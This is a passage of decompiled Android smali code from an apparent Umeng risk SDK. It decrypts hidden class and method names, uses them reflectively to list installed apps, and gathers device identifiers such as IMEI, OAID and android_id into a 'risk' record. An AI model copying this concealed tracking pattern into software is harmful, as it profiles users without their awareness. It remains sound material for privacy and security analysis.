.class public Lcom/uyumao/r$a;
.super Ljava/lang/Object;
.source "SourceFile"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/uyumao/r;->run()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x1
    name = null
.end annotation


# instance fields
.field public final synthetic a:Landroid/content/Context;

.field public final synthetic b:I

.field public final synthetic c:I

.field public final synthetic d:Ljava/lang/String;

.field public final synthetic e:Lcom/uyumao/r;


# direct methods
.method public constructor <init>(Lcom/uyumao/r;Landroid/content/Context;IILjava/lang/String;)V
    .locals 0

    .line 1
    iput-object p1, p0, Lcom/uyumao/r$a;->e:Lcom/uyumao/r;

    .line 2
    .line 3
    iput-object p2, p0, Lcom/uyumao/r$a;->a:Landroid/content/Context;

    .line 4
    .line 5
    iput p3, p0, Lcom/uyumao/r$a;->b:I

    .line 6
    .line 7
    iput p4, p0, Lcom/uyumao/r$a;->c:I

    .line 8
    .line 9
    iput-object p5, p0, Lcom/uyumao/r$a;->d:Ljava/lang/String;

    .line 10
    .line 11
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 12
    .line 13
    .line 14
    return-void
.end method


# virtual methods
.method public run()V
    .locals 24

    .line 1
    move-object/from16 v1, p0

    .line 2
    .line 3
    const-string v0, "forbid_sdk"

    .line 4
    .line 5
    const-string v2, "local_hit_sdk"

    .line 6
    .line 7
    const-string v3, "hit_sdk"

    .line 8
    .line 9
    const-string v4, "2G/3G"

    .line 10
    .line 11
    const-string v5, "sdk"

    .line 12
    .line 13
    const-string v6, "p"

    .line 14
    .line 15
    const/4 v7, 0x0

    .line 16
    :try_start_0
    new-instance v8, Ljava/util/TreeSet;

    .line 17
    .line 18
    invoke-direct {v8}, Ljava/util/TreeSet;-><init>()V

    .line 19
    .line 20
    .line 21
    new-instance v9, Ljava/io/ByteArrayOutputStream;

    .line 22
    .line 23
    invoke-direct {v9}, Ljava/io/ByteArrayOutputStream;-><init>()V
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_a

    .line 24
    .line 25
    .line 26
    const/16 v10, 0xbb

    .line 27
    .line 28
    :try_start_1
    new-array v11, v10, [B

    .line 29
    .line 30
    fill-array-data v11, :array_0

    .line 31
    .line 32
    .line 33
    const/16 v12, 0xb3

    .line 34
    .line 35
    invoke-static {v11, v12, v10}, Ljava/util/Arrays;->copyOfRange([BII)[B

    .line 36
    .line 37
    .line 38
    move-result-object v10

    .line 39
    invoke-static {v11, v12}, Ljava/util/Arrays;->copyOf([BI)[B

    .line 40
    .line 41
    .line 42
    move-result-object v11

    .line 43
    invoke-static {v11, v10}, Lcom/uyumao/e;->a([B[B)[B

    .line 44
    .line 45
    .line 46
    invoke-static {v11, v9}, Lcom/uyumao/e;->a([BLjava/io/OutputStream;)V

    .line 47
    .line 48
    .line 49
    new-instance v10, Lorg/json/JSONObject;

    .line 50
    .line 51
    invoke-virtual {v9}, Ljava/io/ByteArrayOutputStream;->toString()Ljava/lang/String;

    .line 52
    .line 53
    .line 54
    move-result-object v11

    .line 55
    invoke-direct {v10, v11}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    .line 56
    .line 57
    .line 58
    const-string v11, "c"

    .line 59
    .line 60
    invoke-virtual {v10, v11}, Lorg/json/JSONObject;->optString(Ljava/lang/String;)Ljava/lang/String;

    .line 61
    .line 62
    .line 63
    move-result-object v11

    .line 64
    invoke-virtual {v10, v6}, Lorg/json/JSONObject;->optString(Ljava/lang/String;)Ljava/lang/String;

    .line 65
    .line 66
    .line 67
    move-result-object v12

    .line 68
    iget-object v13, v1, Lcom/uyumao/r$a;->a:Landroid/content/Context;

    .line 69
    .line 70
    invoke-static {v11, v12, v7, v13, v7}, Lcom/uyumao/t;->a(Ljava/lang/String;Ljava/lang/String;[Ljava/lang/Class;Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    .line 71
    .line 72
    .line 73
    move-result-object v7

    .line 74
    iget v11, v1, Lcom/uyumao/r$a;->b:I
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_9

    .line 75
    .line 76
    const-string v12, "t"

    .line 77
    .line 78
    const-string v13, "n"

    .line 79
    .line 80
    const-string v14, "a"

    .line 81
    .line 82
    const-string v15, "u"

    .line 83
    .line 84
    move-object/from16 v16, v0

    .line 85
    .line 86
    const-string v0, "m"

    .line 87
    .line 88
    move-object/from16 v17, v2

    .line 89
    .line 90
    const-string v2, "v"

    .line 91
    .line 92
    move-object/from16 v18, v3

    .line 93
    .line 94
    const-string v3, "i"

    .line 95
    .line 96
    move-object/from16 v19, v5

    .line 97
    .line 98
    const/4 v5, 0x1

    .line 99
    move-object/from16 v20, v4

    .line 100
    .line 101
    if-ne v5, v11, :cond_1

    .line 102
    .line 103
    :try_start_2
    invoke-virtual {v10, v3}, Lorg/json/JSONObject;->optString(Ljava/lang/String;)Ljava/lang/String;

    .line 104
    .line 105
    .line 106
    move-result-object v11

    .line 107
    new-array v4, v5, [Ljava/lang/Class;

    .line 108
    .line 109
    const-class v22, Ljava/lang/String;

    .line 110
    .line 111
    const/16 v21, 0x0

    .line 112
    .line 113
    aput-object v22, v4, v21

    .line 114
    .line 115
    new-array v1, v5, [Ljava/lang/Object;

    .line 116
    .line 117
    invoke-virtual {v10, v14}, Lorg/json/JSONObject;->optString(Ljava/lang/String;)Ljava/lang/String;

    .line 118
    .line 119
    .line 120
    move-result-object v22

    .line 121
    aput-object v22, v1, v21

    .line 122
    .line 123
    invoke-static {v11, v4, v1}, Lcom/uyumao/t;->a(Ljava/lang/String;[Ljava/lang/Class;[Ljava/lang/Object;)Ljava/lang/Object;

    .line 124
    .line 125
    .line 126
    move-result-object v1

    .line 127
    invoke-virtual {v10, v0}, Lorg/json/JSONObject;->optString(Ljava/lang/String;)Ljava/lang/String;

    .line 128
    .line 129
    .line 130
    move-result-object v0

    .line 131
    const-string v4, "q"

    .line 132
    .line 133
    invoke-virtual {v10, v4}, Lorg/json/JSONObject;->optString(Ljava/lang/String;)Ljava/lang/String;

    .line 134
    .line 135
    .line 136
    move-result-object v4

    .line 137
    const/4 v11, 0x2

    .line 138
    new-array v5, v11, [Ljava/lang/Class;

    .line 139
    .line 140
    invoke-virtual {v10, v3}, Lorg/json/JSONObject;->optString(Ljava/lang/String;)Ljava/lang/String;

    .line 141
    .line 142
    .line 143
    move-result-object v23

    .line 144
    invoke-static/range {v23 .. v23}, Lcom/uyumao/t;->a(Ljava/lang/String;)Ljava/lang/Class;

    .line 145
    .line 146
    .line 147
    move-result-object v23

    .line 148
    const/16 v21, 0x0

    .line 149
    .line 150
    aput-object v23, v5, v21

    .line 151
    .line 152
    sget-object v23, Ljava/lang/Integer;->TYPE:Ljava/lang/Class;

    .line 153
    .line 154
    const/16 v22, 0x1

    .line 155
    .line 156
    aput-object v23, v5, v22

    .line 157
    .line 158
    new-array v11, v11, [Ljava/lang/Object;

    .line 159
    .line 160
    aput-object v1, v11, v21

    .line 161
    .line 162
    invoke-static/range {v21 .. v21}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    .line 163
    .line 164
    .line 165
    move-result-object v1

    .line 166
    aput-object v1, v11, v22

    .line 167
    .line 168
    invoke-static {v0, v4, v5, v7, v11}, Lcom/uyumao/t;->a(Ljava/lang/String;Ljava/lang/String;[Ljava/lang/Class;Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    .line 169
    .line 170
    .line 171
    move-result-object v0

    .line 172
    instance-of v1, v0, Ljava/util/List;

    .line 173
    .line 174
    if-eqz v1, :cond_3

    .line 175
    .line 176
    const-string v1, "r"

    .line 177
    .line 178
    invoke-virtual {v10, v1}, Lorg/json/JSONObject;->optString(Ljava/lang/String;)Ljava/lang/String;

    .line 179
    .line 180
    .line 181
    move-result-object v1

    .line 182
    const-string v4, "s"

    .line 183
    .line 184
    invoke-virtual {v10, v4}, Lorg/json/JSONObject;->optString(Ljava/lang/String;)Ljava/lang/String;

    .line 185
    .line 186
    .line 187
    move-result-object v4

    .line 188
    invoke-static {v1, v4}, Lcom/uyumao/t;->a(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/reflect/Field;

    .line 189
    .line 190
    .line 191
    move-result-object v1

    .line 192
    invoke-virtual {v10, v12}, Lorg/json/JSONObject;->optString(Ljava/lang/String;)Ljava/lang/String;

    .line 193
    .line 194
    .line 195
    move-result-object v4

    .line 196
    invoke-virtual {v10, v13}, Lorg/json/JSONObject;->optString(Ljava/lang/String;)Ljava/lang/String;

    .line 197
    .line 198
    .line 199
    move-result-object v5

    .line 200
    invoke-static {v4, v5}, Lcom/uyumao/t;->a(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/reflect/Field;

    .line 201
    .line 202
    .line 203
    move-result-object v4

    .line 204
    check-cast v0, Ljava/util/List;

    .line 205
    .line 206
    invoke-interface {v0}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    .line 207
    .line 208
    .line 209
    move-result-object v0

    .line 210
    :cond_0
    :goto_0
    invoke-interface {v0}, Ljava/util/Iterator;->hasNext()Z

    .line 211
    .line 212
    .line 213
    move-result v5

    .line 214
    if-eqz v5, :cond_3

    .line 215
    .line 216
    invoke-interface {v0}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    .line 217
    .line 218
    .line 219
    move-result-object v5

    .line 220
    invoke-static {v1, v5}, Lcom/uyumao/t;->a(Ljava/lang/reflect/Field;Ljava/lang/Object;)Ljava/lang/Object;

    .line 221
    .line 222
    .line 223
    move-result-object v5

    .line 224
    invoke-static {v4, v5}, Lcom/uyumao/t;->a(Ljava/lang/reflect/Field;Ljava/lang/Object;)Ljava/lang/Object;

    .line 225
    .line 226
    .line 227
    move-result-object v5

    .line 228
    if-eqz v5, :cond_0

    .line 229
    .line 230
    check-cast v5, Ljava/lang/String;

    .line 231
    .line 232
    invoke-virtual {v8, v5}, Ljava/util/TreeSet;->add(Ljava/lang/Object;)Z

    .line 233
    .line 234
    .line 235
    goto :goto_0

    .line 236
    :cond_1
    invoke-virtual {v10, v0}, Lorg/json/JSONObject;->optString(Ljava/lang/String;)Ljava/lang/String;

    .line 237
    .line 238
    .line 239
    move-result-object v0

    .line 240
    invoke-virtual {v10, v15}, Lorg/json/JSONObject;->optString(Ljava/lang/String;)Ljava/lang/String;

    .line 241
    .line 242
    .line 243
    move-result-object v1

    .line 244
    const/4 v4, 0x1

    .line 245
    new-array v5, v4, [Ljava/lang/Class;

    .line 246
    .line 247
    sget-object v11, Ljava/lang/Integer;->TYPE:Ljava/lang/Class;

    .line 248
    .line 249
    const/16 v21, 0x0

    .line 250
    .line 251
    aput-object v11, v5, v21

    .line 252
    .line 253
    new-array v11, v4, [Ljava/lang/Object;

    .line 254
    .line 255
    invoke-static/range {v21 .. v21}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    .line 256
    .line 257
    .line 258
    move-result-object v4

    .line 259
    aput-object v4, v11, v21

    .line 260
    .line 261
    invoke-static {v0, v1, v5, v7, v11}, Lcom/uyumao/t;->a(Ljava/lang/String;Ljava/lang/String;[Ljava/lang/Class;Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    .line 262
    .line 263
    .line 264
    move-result-object v0

    .line 265
    instance-of v1, v0, Ljava/util/List;

    .line 266
    .line 267
    if-eqz v1, :cond_3

    .line 268
    .line 269
    invoke-virtual {v10, v2}, Lorg/json/JSONObject;->optString(Ljava/lang/String;)Ljava/lang/String;

    .line 270
    .line 271
    .line 272
    move-result-object v1

    .line 273
    invoke-virtual {v10, v13}, Lorg/json/JSONObject;->optString(Ljava/lang/String;)Ljava/lang/String;

    .line 274
    .line 275
    .line 276
    move-result-object v4

    .line 277
    invoke-static {v1, v4}, Lcom/uyumao/t;->a(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/reflect/Field;

    .line 278
    .line 279
    .line 280
    move-result-object v1

    .line 281
    check-cast v0, Ljava/util/List;

    .line 282
    .line 283
    invoke-interface {v0}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    .line 284
    .line 285
    .line 286
    move-result-object v0

    .line 287
    :cond_2
    :goto_1
    invoke-interface {v0}, Ljava/util/Iterator;->hasNext()Z

    .line 288
    .line 289
    .line 290
    move-result v4

    .line 291
    if-eqz v4, :cond_3

    .line 292
    .line 293
    invoke-interface {v0}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    .line 294
    .line 295
    .line 296
    move-result-object v4

    .line 297
    invoke-static {v1, v4}, Lcom/uyumao/t;->a(Ljava/lang/reflect/Field;Ljava/lang/Object;)Ljava/lang/Object;

    .line 298
    .line 299
    .line 300
    move-result-object v4

    .line 301
    if-eqz v4, :cond_2

    .line 302
    .line 303
    check-cast v4, Ljava/lang/String;

    .line 304
    .line 305
    invoke-virtual {v8, v4}, Ljava/util/TreeSet;->add(Ljava/lang/Object;)Z

    .line 306
    .line 307
    .line 308
    goto :goto_1

    .line 309
    :cond_3
    invoke-virtual {v8}, Ljava/util/TreeSet;->isEmpty()Z

    .line 310
    .line 311
    .line 312
    move-result v0
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_8

    .line 313
    if-eqz v0, :cond_4

    .line 314
    .line 315
    invoke-static {v9}, Lcom/uyumao/n;->a(Ljava/io/Closeable;)V

    .line 316
    .line 317
    .line 318
    return-void

    .line 319
    :cond_4
    if-nez v7, :cond_5

    .line 320
    .line 321
    invoke-static {v9}, Lcom/uyumao/n;->a(Ljava/io/Closeable;)V

    .line 322
    .line 323
    .line 324
    return-void

    .line 325
    :cond_5
    :try_start_3
    new-instance v0, Ljava/util/ArrayList;

    .line 326
    .line 327
    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    .line 328
    .line 329
    .line 330
    new-instance v1, Lorg/json/JSONArray;

    .line 331
    .line 332
    invoke-direct {v1}, Lorg/json/JSONArray;-><init>()V

    .line 333
    .line 334
    .line 335
    invoke-virtual {v8}, Ljava/util/TreeSet;->iterator()Ljava/util/Iterator;

    .line 336
    .line 337
    .line 338
    move-result-object v4

    .line 339
    const/4 v5, 0x0

    .line 340
    :goto_2
    invoke-interface {v4}, Ljava/util/Iterator;->hasNext()Z

    .line 341
    .line 342
    .line 343
    move-result v8

    .line 344
    if-eqz v8, :cond_8

    .line 345
    .line 346
    invoke-interface {v4}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    .line 347
    .line 348
    .line 349
    move-result-object v8

    .line 350
    check-cast v8, Ljava/lang/String;

    .line 351
    .line 352
    const/4 v10, 0x0

    .line 353
    invoke-static {v7, v8, v10}, Lcom/uyumao/n;->a(Ljava/lang/Object;Ljava/lang/String;I)Ljava/lang/Object;

    .line 354
    .line 355
    .line 356
    move-result-object v8

    .line 357
    if-nez v8, :cond_6

    .line 358
    .line 359
    goto :goto_2

    .line 360
    :cond_6
    new-instance v10, Lcom/uyumao/p;

    .line 361
    .line 362
    invoke-direct {v10, v7, v8}, Lcom/uyumao/p;-><init>(Ljava/lang/Object;Ljava/lang/Object;)V

    .line 363
    .line 364
    .line 365
    new-instance v8, Lorg/json/JSONObject;

    .line 366
    .line 367
    invoke-direct {v8}, Lorg/json/JSONObject;-><init>()V

    .line 368
    .line 369
    .line 370
    iget-object v11, v10, Lcom/uyumao/p;->b:Ljava/lang/String;

    .line 371
    .line 372
    invoke-virtual {v8, v14, v11}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 373
    .line 374
    .line 375
    iget-object v11, v10, Lcom/uyumao/p;->a:Ljava/lang/String;

    .line 376
    .line 377
    invoke-virtual {v8, v6, v11}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 378
    .line 379
    .line 380
    iget-object v11, v10, Lcom/uyumao/p;->c:Ljava/lang/String;

    .line 381
    .line 382
    invoke-virtual {v8, v2, v11}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 383
    .line 384
    .line 385
    iget v11, v10, Lcom/uyumao/p;->f:I

    .line 386
    .line 387
    invoke-virtual {v8, v12, v11}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    .line 388
    .line 389
    .line 390
    move-object v11, v6

    .line 391
    move-object v13, v7

    .line 392
    iget-wide v6, v10, Lcom/uyumao/p;->d:J

    .line 393
    .line 394
    invoke-virtual {v8, v3, v6, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;J)Lorg/json/JSONObject;

    .line 395
    .line 396
    .line 397
    iget-wide v6, v10, Lcom/uyumao/p;->e:J

    .line 398
    .line 399
    invoke-virtual {v8, v15, v6, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;J)Lorg/json/JSONObject;

    .line 400
    .line 401
    .line 402
    invoke-virtual {v1, v8}, Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;

    .line 403
    .line 404
    .line 405
    add-int/lit8 v5, v5, 0x1

    .line 406
    .line 407
    invoke-virtual {v1}, Lorg/json/JSONArray;->length()I

    .line 408
    .line 409
    .line 410
    move-result v6
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_8

    .line 411
    move-object/from16 v8, p0

    .line 412
    .line 413
    :try_start_4
    iget v7, v8, Lcom/uyumao/r$a;->c:I

    .line 414
    .line 415
    if-ne v6, v7, :cond_7

    .line 416
    .line 417
    invoke-virtual {v0, v1}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 418
    .line 419
    .line 420
    new-instance v1, Lorg/json/JSONArray;

    .line 421
    .line 422
    invoke-direct {v1}, Lorg/json/JSONArray;-><init>()V

    .line 423
    .line 424
    .line 425
    :cond_7
    move-object v6, v11

    .line 426
    move-object v7, v13

    .line 427
    goto :goto_2

    .line 428
    :cond_8
    move-object/from16 v8, p0

    .line 429
    .line 430
    invoke-virtual {v1}, Lorg/json/JSONArray;->length()I

    .line 431
    .line 432
    .line 433
    move-result v3

    .line 434
    if-lez v3, :cond_9

    .line 435
    .line 436
    invoke-virtual {v0, v1}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 437
    .line 438
    .line 439
    :cond_9
    invoke-virtual {v0}, Ljava/util/ArrayList;->isEmpty()Z

    .line 440
    .line 441
    .line 442
    move-result v1
    :try_end_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_7

    .line 443
    if-eqz v1, :cond_a

    .line 444
    .line 445
    invoke-static {v9}, Lcom/uyumao/n;->a(Ljava/io/Closeable;)V

    .line 446
    .line 447
    .line 448
    return-void

    .line 449
    :cond_a
    :try_start_5
    new-instance v1, Lorg/json/JSONObject;

    .line 450
    .line 451
    invoke-direct {v1}, Lorg/json/JSONObject;-><init>()V
    :try_end_5
    .catchall {:try_start_5 .. :try_end_5} :catchall_7

    .line 452
    .line 453
    .line 454
    const-string v3, "zid"

    .line 455
    .line 456
    :try_start_6
    iget-object v4, v8, Lcom/uyumao/r$a;->a:Landroid/content/Context;

    .line 457
    .line 458
    invoke-static {v4}, Lcom/umeng/commonsdk/utils/UMUtils;->getZid(Landroid/content/Context;)Ljava/lang/String;

    .line 459
    .line 460
    .line 461
    move-result-object v4

    .line 462
    invoke-virtual {v1, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :try_end_6
    .catchall {:try_start_6 .. :try_end_6} :catchall_7

    .line 463
    .line 464
    .line 465
    const-string v3, "appkey"

    .line 466
    .line 467
    :try_start_7
    iget-object v4, v8, Lcom/uyumao/r$a;->d:Ljava/lang/String;

    .line 468
    .line 469
    invoke-virtual {v1, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :try_end_7
    .catchall {:try_start_7 .. :try_end_7} :catchall_7

    .line 470
    .line 471
    .line 472
    const-string v3, "umid"

    .line 473
    .line 474
    :try_start_8
    iget-object v4, v8, Lcom/uyumao/r$a;->a:Landroid/content/Context;

    .line 475
    .line 476
    invoke-static {v4}, Lcom/umeng/commonsdk/utils/UMUtils;->getUMId(Landroid/content/Context;)Ljava/lang/String;

    .line 477
    .line 478
    .line 479
    move-result-object v4

    .line 480
    invoke-virtual {v1, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 481
    .line 482
    .line 483
    const-string v3, "3.0"

    .line 484
    .line 485
    invoke-virtual {v1, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 486
    .line 487
    .line 488
    const-string v2, "sdk_v"

    .line 489
    .line 490
    const-string v3, "1.1.4"

    .line 491
    .line 492
    invoke-virtual {v1, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :try_end_8
    .catchall {:try_start_8 .. :try_end_8} :catchall_7

    .line 493
    .line 494
    .line 495
    const-string v2, "os_v"

    .line 496
    .line 497
    :try_start_9
    sget-object v3, Landroid/os/Build$VERSION;->RELEASE:Ljava/lang/String;

    .line 498
    .line 499
    invoke-virtual {v1, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :try_end_9
    .catchall {:try_start_9 .. :try_end_9} :catchall_7

    .line 500
    .line 501
    .line 502
    const-string v2, "brand"

    .line 503
    .line 504
    :try_start_a
    invoke-static {}, Lcom/uyumao/n;->b()Ljava/lang/String;

    .line 505
    .line 506
    .line 507
    move-result-object v3

    .line 508
    invoke-virtual {v1, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :try_end_a
    .catchall {:try_start_a .. :try_end_a} :catchall_7

    .line 509
    .line 510
    .line 511
    const-string v2, "model"

    .line 512
    .line 513
    :try_start_b
    invoke-static {}, Lcom/uyumao/n;->c()Ljava/lang/String;

    .line 514
    .line 515
    .line 516
    move-result-object v3

    .line 517
    invoke-virtual {v1, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 518
    .line 519
    .line 520
    invoke-static {}, Ljava/util/UUID;->randomUUID()Ljava/util/UUID;

    .line 521
    .line 522
    .line 523
    move-result-object v2

    .line 524
    invoke-virtual {v2}, Ljava/util/UUID;->toString()Ljava/lang/String;

    .line 525
    .line 526
    .line 527
    move-result-object v2

    .line 528
    const-string v3, "uuid"

    .line 529
    .line 530
    invoke-virtual {v1, v3, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 531
    .line 532
    .line 533
    const-string v3, "smart_id"

    .line 534
    .line 535
    invoke-virtual {v1, v3, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 536
    .line 537
    .line 538
    const-string v2, "src"

    .line 539
    .line 540
    const-string v3, "risk"

    .line 541
    .line 542
    invoke-virtual {v1, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :try_end_b
    .catchall {:try_start_b .. :try_end_b} :catchall_7

    .line 543
    .line 544
    .line 545
    const-string v2, "imei"

    .line 546
    .line 547
    :try_start_c
    iget-object v3, v8, Lcom/uyumao/r$a;->a:Landroid/content/Context;

    .line 548
    .line 549
    invoke-static {v3}, Lcom/umeng/commonsdk/statistics/common/DeviceConfig;->getImeiNew(Landroid/content/Context;)Ljava/lang/String;

    .line 550
    .line 551
    .line 552
    move-result-object v3

    .line 553
    invoke-virtual {v1, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :try_end_c
    .catchall {:try_start_c .. :try_end_c} :catchall_7

    .line 554
    .line 555
    .line 556
    const-string v2, "oaid"

    .line 557
    .line 558
    :try_start_d
    iget-object v3, v8, Lcom/uyumao/r$a;->a:Landroid/content/Context;

    .line 559
    .line 560
    invoke-static {v3}, Lcom/umeng/commonsdk/statistics/common/DeviceConfig;->getOaid(Landroid/content/Context;)Ljava/lang/String;

    .line 561
    .line 562
    .line 563
    move-result-object v3

    .line 564
    invoke-virtual {v1, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :try_end_d
    .catchall {:try_start_d .. :try_end_d} :catchall_0

    .line 565
    .line 566
    .line 567
    :catchall_0
    const-string v2, "idfa"

    .line 568
    .line 569
    :try_start_e
    iget-object v3, v8, Lcom/uyumao/r$a;->a:Landroid/content/Context;

    .line 570
    .line 571
    invoke-static {v3}, Lcom/umeng/commonsdk/statistics/common/DeviceConfig;->getIdfa(Landroid/content/Context;)Ljava/lang/String;

    .line 572
    .line 573
    .line 574
    move-result-object v3

    .line 575
    invoke-virtual {v1, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :try_end_e
    .catchall {:try_start_e .. :try_end_e} :catchall_1

    .line 576
    .line 577
    .line 578
    :catchall_1
    const-string v2, "android_id"

    .line 579
    .line 580
    :try_start_f
    iget-object v3, v8, Lcom/uyumao/r$a;->a:Landroid/content/Context;

    .line 581
    .line 582
    invoke-static {v3}, Lcom/umeng/commonsdk/statistics/common/DeviceConfig;->getAndroidId(Landroid/content/Context;)Ljava/lang/String;

    .line 583
    .line 584
    .line 585
    move-result-object v3

    .line 586
    invoke-virtual {v1, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :try_end_f
    .catchall {:try_start_f .. :try_end_f} :catchall_7

    .line 587
    .line 588
    .line 589
    const-string v2, "pkg"

    .line 590
    .line 591
    :try_start_10
    iget-object v3, v8, Lcom/uyumao/r$a;->a:Landroid/content/Context;

    .line 592
    .line 593
    invoke-virtual {v3}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    .line 594
    .line 595
    .line 596
    move-result-object v3

    .line 597
    invoke-virtual {v1, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :try_end_10
    .catchall {:try_start_10 .. :try_end_10} :catchall_7

    .line 598
    .line 599
    .line 600
    const-string v2, "app_v"

    .line 601
    .line 602
    :try_start_11
    iget-object v3, v8, Lcom/uyumao/r$a;->a:Landroid/content/Context;

    .line 603
    .line 604
    invoke-static {v3}, Lcom/umeng/commonsdk/utils/UMUtils;->getAppVersionName(Landroid/content/Context;)Ljava/lang/String;

    .line 605
    .line 606
    .line 607
    move-result-object v3

    .line 608
    invoke-virtual {v1, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :try_end_11
    .catchall {:try_start_11 .. :try_end_11} :catchall_7

    .line 609
    .line 610
    .line 611
    const-string v2, "board"

    .line 612
    .line 613
    :try_start_12
    invoke-static {}, Lcom/uyumao/n;->a()Ljava/lang/String;

    .line 614
    .line 615
    .line 616
    move-result-object v3

    .line 617
    invoke-virtual {v1, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :try_end_12
    .catchall {:try_start_12 .. :try_end_12} :catchall_7

    .line 618
    .line 619
    .line 620
    :try_start_13
    iget-object v2, v8, Lcom/uyumao/r$a;->a:Landroid/content/Context;

    .line 621
    .line 622
    invoke-static {v2}, Lcom/umeng/commonsdk/utils/UMUtils;->getLocale(Landroid/content/Context;)Ljava/util/Locale;

    .line 623
    .line 624
    .line 625
    move-result-object v2
    :try_end_13
    .catchall {:try_start_13 .. :try_end_13} :catchall_2

    .line 626
    if-eqz v2, :cond_b

    .line 627
    .line 628
    const-string v3, "os_lang"

    .line 629
    .line 630
    :try_start_14
    invoke-virtual {v2}, Ljava/util/Locale;->getLanguage()Ljava/lang/String;

    .line 631
    .line 632
    .line 633
    move-result-object v2

    .line 634
    invoke-virtual {v1, v3, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :try_end_14
    .catchall {:try_start_14 .. :try_end_14} :catchall_2

    .line 635
    .line 636
    .line 637
    :catchall_2
    :cond_b
    const-string v2, "c_ts"

    .line 638
    .line 639
    :try_start_15
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    .line 640
    .line 641
    .line 642
    move-result-wide v3

    .line 643
    invoke-virtual {v1, v2, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;J)Lorg/json/JSONObject;

    .line 644
    .line 645
    .line 646
    const-string v2, "total"

    .line 647
    .line 648
    invoke-virtual {v1, v2, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;
    :try_end_15
    .catchall {:try_start_15 .. :try_end_15} :catchall_7

    .line 649
    .line 650
    .line 651
    const-string v2, "os_i"

    .line 652
    .line 653
    :try_start_16
    sget v3, Landroid/os/Build$VERSION;->SDK_INT:I

    .line 654
    .line 655
    invoke-virtual {v1, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;
    :try_end_16
    .catchall {:try_start_16 .. :try_end_16} :catchall_3

    .line 656
    .line 657
    .line 658
    const-string v2, "os_t"

    .line 659
    .line 660
    :try_start_17
    iget-object v3, v8, Lcom/uyumao/r$a;->a:Landroid/content/Context;

    .line 661
    .line 662
